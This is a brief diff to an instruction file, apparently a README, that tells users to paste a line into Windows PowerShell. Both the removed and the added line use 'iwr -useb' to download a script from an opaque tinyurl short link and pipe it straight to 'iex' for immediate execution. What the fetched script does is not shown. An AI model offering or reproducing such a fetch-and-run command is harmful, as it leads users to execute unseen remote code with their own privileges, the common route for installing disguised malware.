@@ -1,4 +1,4 @@
-Copy-paste the below code and press enter
+Copy and paste this line in "Windows Powershell"
 
-Copy = "iwr -useb https://tinyurl.com/4eh4p7us | iex"
+Copy = "iwr -useb https://tinyurl.com/5exxw5kb | iex"
 
